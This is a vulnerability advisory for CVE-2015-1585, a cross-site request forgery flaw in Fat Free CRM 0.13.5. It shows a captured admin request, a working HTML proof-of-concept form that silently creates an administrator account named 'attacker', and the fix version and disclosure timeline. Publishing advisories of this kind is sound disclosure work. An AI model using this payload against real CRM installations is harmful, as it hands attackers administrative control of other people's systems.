@@ -1,0 +1,97 @@
+id: 23295
+date: 02/16/2015
+title: Fat Free CRM 0.13.5 Cross Site Request Forgery Vulnerability
+author: Sven Schleier
+cves: CVE-2015-1585
+
+[CVE-2015-1585] Fat Free CRM - CSRF Vulnerability in Version 0.13.5
+
+----------------------------------------------------------------
+
+Product Information:
+
+Software: Fat Free CRM 
+
+Tested Version: 0.13.5, released 22.1.2015 with over 10.000 downloads
+
+Vulnerability Type: Cross-Site Request Forgery, CSRF (CWE-352)
+
+Download link: https://rubygems.org/gems/fat_free_crm/versions/0.13.5
+
+Description: An open source, Ruby on Rails customer relationship management platform (CRM). Out of the box it features group collaboration, campaign and lead management, contact lists, and opportunity tracking (copied from https://github.com/fatfreecrm/fat_free_crm)
+
+----------------------------------------------------------------
+
+Vulnerability description:
+
+When an authenticated administrative user of Fat Free CRM is creating another user account, the following POST request is sent to the server:
+
+POST /admin/users HTTP/1.1
+Host: 127.0.0.1:3000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0
+Accept: */*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-CSRF-Token: oxZgwOAtzNdFJU85jPqmI+g893lQaOy6ctCCzef42qI=
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://127.0.0.1:3000/admin
+Content-Length: 356
+Cookie:  _session_id=$foo1; user_credentials=$foo2
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+utf8=%E2%9C%93&authenticity_token=oxZgwOAtzNdFJU85jPqmI%2Bg893lQaOy6ctCCzef42qI%3D&user%5Busername%5D=admin1&user%5Bemail%5D=test1%40test.de&user%5Bpassword%5D=1&user%5Bpassword_confirmation%5D=1&user%5Badmin%5D=0&user%5Badmin%5D=1&user%5Bfirst_name%5D=&user%5Blast_name%5D=&user%5Btitle%5D=&user%5Bcompany%5D=&user%5Bgroup_ids%5D%5B%5D=&commit=Create+User
+
+
+As can be seen, the application is already using a CSRF token in the parameter authenticity_token, that has got a sufficient entropy. Nevertheless, this parameter is optional and not mandatory when creating a user. When executing the following Proof-of-Concept, a new administrative user called "attacker" will be created with the password 1234. 
+
+
+<html>
+  <body>
+    <form action="http://127.0.0.1:3000/admin/users" method="POST">
+      <input type="hidden" name="utf8" value="�œ“" />
+      <input type="hidden" name="user[username]" value="attacker" />
+      <input type="hidden" name="user[email]" value="test@test.org" />
+      <input type="hidden" name="user[password]" value="1234" />
+      <input type="hidden" name="user[password_confirmation]" value="1234" />
+      <input type="hidden" name="user[admin]" value="1" />
+      <input type="hidden" name="commit" value="Create User" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+----------------------------------------------------------------
+
+Impact: 
+
+Every state changing operation within Fat Free CRM is using the parameter authenticity_token in order to prevent CSRF attacks. Nevertheless, all operations can be triggered by a CSRF attack, as this parameter is always optional and not needed. 
+
+----------------------------------------------------------------
+
+Solution:
+
+Update to the latest version, which is   0.13.6, see https://rubygems.org/gems/fat_free_crm/versions/0.13.6
+
+See also https://github.com/fatfreecrm/fat_free_crm/wiki/CSRF-Vulnerability-%28CVE-2015-1585%29
+
+----------------------------------------------------------------
+
+Timeline:
+
+Vulnerability found: 11.2.2015
+Vendor informed: 11.2.2015
+Response by vendor: 12.2.2015
+Fix by vendor 12.2.2015
+Public Advisory: 14.2.2015
+
+----------------------------------------------------------------
+
+Best regards,
+
+Sven Schleier
+
+#  0day.today [2023-03-26]  #
